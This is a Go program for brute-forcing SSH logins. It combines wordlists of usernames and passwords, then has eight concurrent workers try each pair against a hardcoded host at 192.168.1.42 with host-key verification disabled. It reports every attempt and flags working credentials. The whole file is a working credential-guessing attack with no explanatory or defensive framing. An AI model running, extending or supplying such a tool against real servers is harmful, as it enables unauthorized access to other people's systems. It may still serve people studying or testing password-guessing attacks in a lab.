package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const TARGET = "192.168.1.42"

var wg sync.WaitGroup

func check(e error) {
	if e != nil {
		fmt.Println("[error] ", e)
	}
}

type credential struct {
	user string
	pass string
	pos  string
}

type requestAttack struct {
	cred    *credential
	resChan chan<- *result
}

type result struct {
	cred      *credential
	timeTaken time.Duration
	res       string
	err       error
}

func readFiles(
	userFile string,
	passFile string,
) <-chan *credential {
	credentialStream := make(chan *credential)
	go func() {
		defer close(credentialStream)

		f1, err := os.Open(userFile)
		check(err)
		f2, err := os.Open(passFile)
		check(err)

		// define closing of files
		defer func() {
			f1.Close()
			f2.Close()
		}()

		// File reader line by line.
		ureader := bufio.NewScanner(f1)
		preader := bufio.NewScanner(f2)

		var userList []string // it is saved in an array so as not to read the user list again
		for i := 0; preader.Scan(); i++ {
			if i == 0 {
				for j := 0; ureader.Scan(); j++ {
					userList = append(userList, ureader.Text())
					credentialStream <- &credential{user: userList[len(userList)-1],
						pass: preader.Text(),
						pos:  strconv.Itoa(j) + "-" + strconv.Itoa(i)}
				}
				if err := ureader.Err(); err != nil {
					check(err)
				}
			} else {
				for j, u := range userList {
					credentialStream <- &credential{user: u,
						pass: preader.Text(),
						pos:  strconv.Itoa(j) + "-" + strconv.Itoa(i)}
				}
			}
		}
		if err := preader.Err(); err != nil {
			check(err)
		}
	}()
	return credentialStream
}

func (c *credential) SSHtest() (string, error) {
	//SSH basic connection
	config := &ssh.ClientConfig{
		User: c.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(c.pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	//Recover function
	defer func() {
		r := recover()
		if r != nil {
			fmt.Println(r)
		}
	}()

	t := net.JoinHostPort(TARGET, "22")

	_, err := ssh.Dial("tcp", t, config)

	if err != nil {
		return "", err
	}
	return "ok", err
}

func worker(reqStream <-chan *requestAttack, name string) {
	for {
		if r, ok := <-reqStream; ok {
			t := time.Now()
			res, err := r.cred.SSHtest()

			r.resChan <- &result{cred: r.cred, timeTaken: time.Since(t), res: res, err: err}
		} else {
			fmt.Println("[worker " + name + "] DEAD")
		}
	}
}

func (c *credential) manageConcurrently(
	reqStream chan<- *requestAttack,
	resultStream chan<- *result) {
	responseChan := make(chan *result)

	// send a request to a worker
	reqStream <- &requestAttack{cred: c, resChan: responseChan}

	// get the response
	response := <-responseChan

	//manage de response
	/*
		TODO
	*/

	//send response result
	resultStream <- response
	wg.Done()
}

func startAttack(nWorkers int) {
	reqStream := make(chan *requestAttack)

	for i := 0; i < nWorkers; i++ {
		fmt.Println("[worker", i, "] Staying Alive")
		go worker(reqStream, fmt.Sprint(i))
	}

	credList := readFiles("../users.txt", "../passwords.txt")

	resultStream := make(chan *result)
	numCredentials := 0

	go func() {
		for c := range credList {
			numCredentials++
			wg.Add(1)
			go c.manageConcurrently(reqStream, resultStream)
		}
		wg.Wait()
		close(reqStream)
		close(resultStream)
		fmt.Println("[!] Closing the channels")
	}()

	for r := range resultStream {
		if r.err == nil {
			fmt.Printf("[+] %v\t%v\t%v\t%v\n", r.cred.user+":"+r.cred.pass, r.cred.pos, r.timeTaken, r.err)
		} else {
			fmt.Printf("[-] %v\t%v\t%v\t%v\n", r.cred.user+":"+r.cred.pass, r.cred.pos, r.timeTaken, r.err)
		}
	}

}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	start := time.Now()
	startAttack(8)

	fmt.Printf("Atack took: %v\n", time.Since(start))

}
